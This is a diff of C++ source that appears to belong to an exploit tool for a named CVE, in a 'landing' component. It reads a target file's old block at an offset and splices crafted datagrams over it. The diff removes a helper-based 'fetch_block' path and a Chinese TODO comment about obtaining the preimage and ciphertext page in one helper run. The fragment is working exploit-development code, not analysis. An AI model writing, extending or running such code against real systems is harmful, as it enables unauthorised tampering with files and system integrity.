@@ -52,16 +52,6 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         /** Read bytes at an offset from the file, or a negative value. */
         [[nodiscard]] virtual long read_at(int fd, std::uint8_t *out, std::size_t size,
                                            std::uint64_t offset) noexcept = 0;
-        /** One block, from the one helper run that yields the preimage and the ciphertext at once.
-         *  A surface with a readable descriptor answers with the direct read, which is why the
-         *  default is that read rather than a second path. */
-        [[nodiscard]] virtual long fetch_block(int fd, std::uint8_t out[kBlockBytes],
-                                               std::uint64_t offset) noexcept {
-            return read_at(fd, out, kBlockBytes, offset);
-        }
-        /** Whether splice_one takes the ciphertext page from the datagram's own ciphertext slot
-         *  (the bytes fetch_block returned) instead of reading the carrier a second time. */
-        [[nodiscard]] virtual bool page_in_frame() const noexcept { return false; }
         /** Send one datagram built from the block. */
         [[nodiscard]] virtual bool splice_one(int socket_fd, const std::uint8_t *datagram,
                                               std::size_t size, std::uint64_t offset) noexcept = 0;
@@ -148,11 +138,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 return false;
             }
             std::uint8_t old_block[kBlockBytes] = {};
-            /* 旧码（本轮替换：一次 helper 同时取 preimage 与密文页）：
-             * if (splice_.read_at(doors_.file_fd(), old_block, kBlockBytes, position) != ...
-             * TODO(2026-10-16：fetch_block 在无 fd 时用一次 helper exec 同时给出 preimage 与
-             * 密文页，splice_one 再从帧里映射同一份字节；门禁全绿并确认后删除本旧码块)。 */
-            if (splice_.fetch_block(doors_.file_fd(), old_block, position) !=
+            if (splice_.read_at(doors_.file_fd(), old_block, kBlockBytes, position) !=
                 static_cast<long>(kBlockBytes)) {
                 /* No vector without the old block, so there is no datagram to send. */
                 outcome_ = WriteOutcome::NoOldBlock;
